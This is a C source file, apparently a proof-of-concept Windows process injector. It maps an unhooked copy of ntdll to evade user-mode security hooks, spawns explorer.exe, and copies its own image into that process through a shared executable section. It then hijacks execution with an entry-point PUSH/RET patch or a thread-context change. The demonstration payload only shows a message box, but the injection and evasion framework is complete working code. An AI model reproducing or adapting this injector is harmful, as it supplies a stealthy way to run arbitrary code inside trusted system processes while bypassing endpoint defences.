#include "Imports.h"

typedef struct
{
	WORD	Offset : 12;
	WORD	Type : 4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef struct _InjectionData
{
	LPVOID remoteSection;
	LPVOID localSection;
}InjectionData, *PInjectionData;

#define MAX_PAYLOAD_SIZE 256

NtOpenSection_ NtOpenSection;
NtCreateSection_ NtCreateSection;
NtMapViewOfSection_ NtMapViewOfSection;
NtUnmapViewOfSection_ NtUnmapViewOfSection;
NtClose_ NtClose;
RtlDosPathNameToNtPathName_U_ RtlDosPathNameToNtPathName_U;
RtlCreateProcessParameters_ RtlCreateProcessParameters;
RtlCreateUserProcess_ RtlCreateUserProcess;
RtlFreeUnicodeString_ RtlFreeUnicodeString;
RtlDestroyProcessParameters_ RtlDestroyProcessParameters;
NtResumeProcess_ NtResumeProcess;
NtWriteVirtualMemory_ NtWriteVirtualMemory;
NtSetContextThread_ NtSetContextThread;
NtGetContextThread_ NtGetContextThread;
NtCreateTransaction_ NtCreateTransaction;



void ProcessBaseRelocations(PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD Size)
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;
	PIMAGE_FIXUP_ENTRY Fixup = 0;
	DWORD i = 0;
	while ((DWORD)Reloc - (DWORD)Relocs < Size)
	{
		if (!Reloc->SizeOfBlock)
		{
			break;
		}
		Fixup = (PIMAGE_FIXUP_ENTRY)((DWORD)Reloc + sizeof(IMAGE_BASE_RELOCATION));
		for (i = 0; i < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; i++, Fixup++)
		{
			DWORD dwPointerRVA = ((DWORD)Reloc->VirtualAddress + Fixup->Offset);

			if (Fixup->Offset != 0)
			{
				*(DWORD*)(ImageBase + dwPointerRVA) += Delta;
			}
		}
		Reloc = (PIMAGE_BASE_RELOCATION)((DWORD)Reloc + Reloc->SizeOfBlock);
	}
}

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString)
{
	DestinationString->Buffer = SourceString;
	DestinationString->MaximumLength = DestinationString->Length = _strlen_w(SourceString) * sizeof(WCHAR);
}

BOOL InitializeNtApi()
{
	HANDLE sectionHandle;
	UNICODE_STRING sectionName;
	OBJECT_ATTRIBUTES objAttrs;
	NTSTATUS Status;
	PVOID lpNtDllBaseAddress = NULL;
	ULONG_PTR viewSize = 0;
	
	void* hModule = GetModuleBase32(L"ntdll.dll");

	NtOpenSection = (NtOpenSection_)GetProcAddress32(hModule, "NtOpenSection");
	if (!NtOpenSection)
	{
		return 0;
	}

	NtMapViewOfSection = (NtMapViewOfSection_)GetProcAddress32(hModule, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
	{
		return 0;
	}

	RtlInitUnicodeString(&sectionName, L"\\KnownDlls32\\ntdll.dll");

	InitializeObjectAttributes(&objAttrs, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = NtOpenSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttrs);

	if (!NT_SUCCESS(Status))
	{
		return 0;
	}
		
	Status = NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &lpNtDllBaseAddress, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);

	if (!NT_SUCCESS(Status))
	{
		return 0;
	}
		
	// At this point lpNtDllBaseAddress is address of ring3 hook free manually mapped ntdll
	if (!lpNtDllBaseAddress)
	{
		return 0;
	}
		

	NtCreateSection = (NtCreateSection_)GetProcAddress32(lpNtDllBaseAddress, "NtCreateSection");
	if (!NtCreateSection)
	{
		return 0;
	}

	NtMapViewOfSection = (NtMapViewOfSection_)GetProcAddress32(lpNtDllBaseAddress, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
	{
		return 0;
	}

	NtUnmapViewOfSection = (NtUnmapViewOfSection_)GetProcAddress32(lpNtDllBaseAddress, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection)
	{
		return 0;
	}

	NtClose = (NtClose_)GetProcAddress32(lpNtDllBaseAddress, "NtClose");
	if (!NtClose)
	{
		return 0;
	}

	RtlDosPathNameToNtPathName_U = (RtlDosPathNameToNtPathName_U_)GetProcAddress32(lpNtDllBaseAddress, "RtlDosPathNameToNtPathName_U");
	if (!RtlDosPathNameToNtPathName_U)
	{
		return 0;
	}

	RtlCreateProcessParameters = (RtlCreateProcessParameters_)GetProcAddress32(lpNtDllBaseAddress, "RtlCreateProcessParameters");
	if (!RtlCreateProcessParameters)
	{
		return 0;
	}

	RtlCreateUserProcess = (RtlCreateUserProcess_)GetProcAddress32(lpNtDllBaseAddress, "RtlCreateUserProcess");
	if (!RtlCreateUserProcess)
	{
		return 0;
	}

	RtlFreeUnicodeString = (RtlFreeUnicodeString_)GetProcAddress32(lpNtDllBaseAddress, "RtlFreeUnicodeString");
	if (!RtlFreeUnicodeString)
	{
		return 0;
	}

	RtlDestroyProcessParameters = (RtlDestroyProcessParameters_)GetProcAddress32(lpNtDllBaseAddress, "RtlDestroyProcessParameters");
	if (!RtlDestroyProcessParameters)
	{
		return 0;
	}

	NtResumeProcess = (NtResumeProcess_)GetProcAddress32(lpNtDllBaseAddress, "NtResumeProcess");
	if (!NtResumeProcess)
	{
		return 0;
	}

	NtWriteVirtualMemory = (NtWriteVirtualMemory_)GetProcAddress32(lpNtDllBaseAddress, "NtWriteVirtualMemory");
	if (!NtWriteVirtualMemory)
	{
		return 0;
	}

	NtSetContextThread = (NtSetContextThread_)GetProcAddress32(lpNtDllBaseAddress, "NtSetContextThread");
	if (!NtSetContextThread)
	{
		return 0;
	}

	NtGetContextThread = (NtGetContextThread_)GetProcAddress32(lpNtDllBaseAddress, "NtGetContextThread");
	if (!NtGetContextThread)
	{
		return 0;
	}

	NtCreateTransaction = (NtCreateTransaction_)GetProcAddress32(lpNtDllBaseAddress, "NtCreateTransaction");
	if (!NtCreateTransaction)
	{
		return 0;
	}

	return 1;
}

BOOL AllocateInjectionData(DWORD Size, PInjectionData injectionData, HANDLE hProc)
{
	BOOL Success = FALSE;
	LARGE_INTEGER sectionSize;
	NTSTATUS Status = 0;
	HANDLE hSection = 0;
	PVOID lpLocal = NULL, lpRemote = NULL;
	SIZE_T ViewSize = 0;
	RtlSecureZeroMemory(&sectionSize, sizeof(LARGE_INTEGER));
	sectionSize.LowPart = Size;

	do
	{
		Status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (!NT_SUCCESS(Status))
			break;

		Status = NtMapViewOfSection(hSection, NtCurrentProcess(), &lpLocal, 0, 0, 0, &ViewSize, 2, 0, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		Status = NtMapViewOfSection(hSection, hProc, &lpRemote, 0, 0, 0, &ViewSize, 2, 0, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		injectionData->localSection = lpLocal;
		injectionData->remoteSection = lpRemote;


		Success = TRUE;
	} while (FALSE);


	if (hSection)
	{
		NtClose(hSection);
	}
		
	if (!Success && lpRemote)
	{
		NtUnmapViewOfSection(hProc, lpRemote);
	}

	if (!Success && lpRemote)
	{
		NtUnmapViewOfSection(NtCurrentProcess(), lpLocal);
	}

	return Success;
}

BOOL RemoveSection(HANDLE hProc, LPVOID Base)
{
	if (!NT_SUCCESS(NtUnmapViewOfSection(hProc, Base)))
	{
		return FALSE;
	}

	return TRUE;
}

DWORD InjectBase(LPTHREAD_START_ROUTINE lpFunction, PInjectionData injectionData)
{
	DWORD dwAddress = 0;
	DWORD imageBase = ((DWORD(*)())GetImageBase)();

	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((DWORD)pDOS + pDOS->e_lfanew);

	if (pNT->Signature == IMAGE_NT_SIGNATURE)
	{
		DWORD relRVA = 0;
		DWORD relSize = 0;
		DWORD i = 0;

		m_memcpy(injectionData->localSection, (LPVOID)imageBase, pNT->OptionalHeader.SizeOfImage);

		relRVA = pNT->OptionalHeader.DataDirectory[5].VirtualAddress;
		relSize = pNT->OptionalHeader.DataDirectory[5].Size;

		dwAddress = ((DWORD)lpFunction - imageBase) + (DWORD)injectionData->remoteSection;

		ProcessBaseRelocations((PIMAGE_BASE_RELOCATION)((DWORD)imageBase + relRVA), (DWORD)injectionData->localSection, (DWORD)injectionData->remoteSection - (DWORD)imageBase, relSize);
	}

	return dwAddress;
}

BOOL CreateUserProcess(wchar_t* wzPath, RTL_USER_PROCESS_INFORMATION *processInfo)
{
	BOOL Success = FALSE;

	NTSTATUS Status;
	PRTL_USER_PROCESS_PARAMETERS pUserProcessParam = NULL;;
	UNICODE_STRING fileName;
	do
	{
		RtlDosPathNameToNtPathName_U(wzPath, &fileName, NULL, NULL);

		Status = RtlCreateProcessParameters(&pUserProcessParam, &fileName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		if (!NT_SUCCESS(Status))
		{
			break;
		}

		Status = RtlCreateUserProcess(&fileName, OBJ_CASE_INSENSITIVE, pUserProcessParam, NULL, NULL, NULL, FALSE, NULL, NULL, processInfo);

		if (!NT_SUCCESS(Status))
		{
			break;
		}


		Success = TRUE;

	} while (FALSE);
	

	// Release data
	RtlDestroyProcessParameters(pUserProcessParam);
	RtlFreeUnicodeString(&fileName);

	return Success;
}

BOOL InstallRemoteEPHook(HANDLE hProc,  LPVOID lpTargetAddress,  LPVOID lpRedirectAddress) 
{
	DWORD  dwOldRights = 0;
	BYTE   hotPatch[7];

	RtlSecureZeroMemory(hotPatch, sizeof(hotPatch));

	if (VirtualProtectEx(hProc, (LPVOID)lpTargetAddress, 6, PAGE_EXECUTE_READWRITE, &dwOldRights) != TRUE) //NtProtectVirtualMemory
	{
		return FALSE;
	}
	
	//Install PUSH/RET redirection and restore it later
	*(BYTE*)(hotPatch) = 0x68;
	*(DWORD*)(hotPatch + 1) = (DWORD)lpRedirectAddress;
	*(BYTE*)(hotPatch + 5) = 0xC3;

	if (NtWriteVirtualMemory(hProc, (LPVOID)lpTargetAddress, &hotPatch, 6, NULL) != STATUS_SUCCESS) // NtWriteVirtualMemory
	{
		return FALSE;
	}
		

	return TRUE;
}

void CreatePayload(LPCVOID lpLdrInitialize,  LPCVOID lpEntryPoint, LPBYTE payloadBuffer) 
{

	//Restore code that we overwrote, swap EAX with our new EP and insert another push/ret
	UCHAR Payload[40];

	// mov eax, entry point address
	Payload[0] = 0xB8;
	Payload[1] = 0x00;
	Payload[2] = 0x00;
	Payload[3] = 0x00;
	Payload[4] = 0x00;

	// mov byte ptr ds:[eax], 40  // 8
	Payload[5] = 0xC6;
	Payload[6] = 0x00;
	Payload[7] = 0x00;

	// mov byte ptr ds:[eax+1],41 // 12
	Payload[8] = 0xC6;
	Payload[9] = 0x40;
	Payload[10] = 0x01;
	Payload[11] = 0x00;

	// mov byte ptr ds:[eax+2],42 // 16
	Payload[12] = 0xC6;
	Payload[13] = 0x40;
	Payload[14] = 0x02;
	Payload[15] = 0x00;

	// mov byte ptr ds:[eax+3],43 // 20
	Payload[16] = 0xC6;
	Payload[17] = 0x40;
	Payload[18] = 0x03;
	Payload[19] = 0x00;

	// mov byte ptr ds:[eax+4],44 // 24
	Payload[20] = 0xC6;
	Payload[21] = 0x40;
	Payload[22] = 0x04;
	Payload[23] = 0x00;

	// mov byte ptr ds:[eax+5],45 // 28
	Payload[24] = 0xC6;
	Payload[25] = 0x40;
	Payload[26] = 0x05;
	Payload[27] = 0x00;

	// mov eax, 0x00000000
	Payload[28] = 0xB8;
	Payload[29] = 0x00;
	Payload[30] = 0x00;
	Payload[31] = 0x00;
	Payload[32] = 0x00;

	// push 00000000
	Payload[33] = 0x68;
	Payload[34] = 0x00;
	Payload[35] = 0x00;
	Payload[36] = 0x00;
	Payload[37] = 0x00;

	// retn
	Payload[38] = 0xC3;

	
	BYTE originalEntryPointCode[7];

	// Code from our own process
	m_memcpy(originalEntryPointCode, lpLdrInitialize, sizeof(originalEntryPointCode));

	
	*(LPVOID*)(Payload + 1) = (LPVOID)lpLdrInitialize;
	*(BYTE*)((DWORD)Payload + 7) = originalEntryPointCode[0];
	*(BYTE*)((DWORD)Payload + 11) = originalEntryPointCode[1];
	*(BYTE*)((DWORD)Payload + 15) = originalEntryPointCode[2];
	*(BYTE*)((DWORD)Payload + 19) = originalEntryPointCode[3];
	*(BYTE*)((DWORD)Payload + 23) = originalEntryPointCode[4];
	*(BYTE*)((DWORD)Payload + 27) = originalEntryPointCode[5];

	// Set the right values
	*(LPVOID*)(Payload + 29) = (LPVOID)lpEntryPoint;
	*(LPVOID*)(Payload + 34) = (LPVOID)lpLdrInitialize; // Call the code again

															
	m_memcpy(payloadBuffer, Payload, sizeof(Payload));

}

BOOL StartInjection(wchar_t* wzPath, LPTHREAD_START_ROUTINE lpFunction, BOOL hookEip)
{
	
	BOOL Injected = FALSE;

	DWORD  dwImageSize = 0;
	DWORD  dwAddress = 0;
	DWORD ldrInitEip = 0;

	InjectionData injectionData;
	CONTEXT Context;
	RTL_USER_PROCESS_INFORMATION PI;


	RtlSecureZeroMemory(&Context, sizeof(CONTEXT));
	RtlSecureZeroMemory(&PI, sizeof(RTL_USER_PROCESS_INFORMATION));
	RtlSecureZeroMemory(&injectionData, sizeof(InjectionData));

	do
	{
		
		if (!CreateUserProcess(wzPath, &PI))
		{
			break;
		}

		Context.ContextFlags = CONTEXT_FULL;

		NtGetContextThread(PI.hThread, &Context); // NTSTATUS // TODO: Error checking
		

		ldrInitEip = Context.Eip;


		dwImageSize = GetModuleSize(((HMODULE(*)())GetImageBase)());
		if (!dwImageSize)
		{
			break;
		}
			

		if (!AllocateInjectionData(dwImageSize + MAX_PAYLOAD_SIZE, &injectionData, PI.hProcess))
		{
			break;
		}
			
		dwAddress = InjectBase(lpFunction, &injectionData);
		if (!dwAddress)
		{
			break;
		}
			

		if (hookEip)
		{

			// Hook very first code called
			LPVOID pPayloadBaseAddress = (LPVOID)((DWORD)injectionData.remoteSection + dwImageSize + 1);
			LPVOID pPayloadBaseAddressLocal = (LPVOID)((DWORD)injectionData.localSection + dwImageSize + 1);

			CreatePayload((LPVOID)ldrInitEip, (LPCVOID)dwAddress, (LPBYTE)pPayloadBaseAddressLocal);

			if (!InstallRemoteEPHook(PI.hProcess, (LPVOID)ldrInitEip, (LPVOID)pPayloadBaseAddress))
			{
				break;
			}
			
		}
		else
		{
			Context.Eax = dwAddress;

			NtSetContextThread(PI.hThread, &Context); // TODO: Error checking
		}
					
		if (!NT_SUCCESS(NtResumeProcess(PI.hProcess))) // ---> Safe substitute for NtResumeThread!
		{
			break;
		}
			

		Injected = TRUE;


	} while (FALSE);


	if (!Injected && PI.hProcess)
	{
		TerminateProcess(PI.hProcess, 0);
	}
		

	if (PI.hProcess)
	{
		CloseHandle(PI.hProcess);
	}
		

	if (PI.hThread)
	{
		CloseHandle(PI.hThread);
	}
		

	if (injectionData.localSection)
	{
		NtUnmapViewOfSection(NtCurrentProcess(), injectionData.localSection);
	}
		

	return Injected;
}

void RemoteEntryPoint()
{
	wchar_t wzFilePath[MAX_PATH * 2]; 
	RtlSecureZeroMemory(wzFilePath, sizeof(wzFilePath));

	GetModuleFileNameW(NULL, wzFilePath, sizeof(wzFilePath));

	MessageBoxW(NULL, wzFilePath, L"Running Inside",  MB_OK);
}

int main()
{

	wchar_t wzInjectionPath[MAX_PATH + 2];
	RtlSecureZeroMemory(wzInjectionPath, sizeof(wzInjectionPath)); // This is just like memset

	ExpandEnvironmentStringsW(L"%windir%\\system32\\explorer.exe", wzInjectionPath, MAX_PATH - 1);

	if (InitializeNtApi())
	{
		StartInjection(wzInjectionPath, (LPTHREAD_START_ROUTINE)RemoteEntryPoint, FALSE);
	}
	
	return EXIT_SUCCESS;
}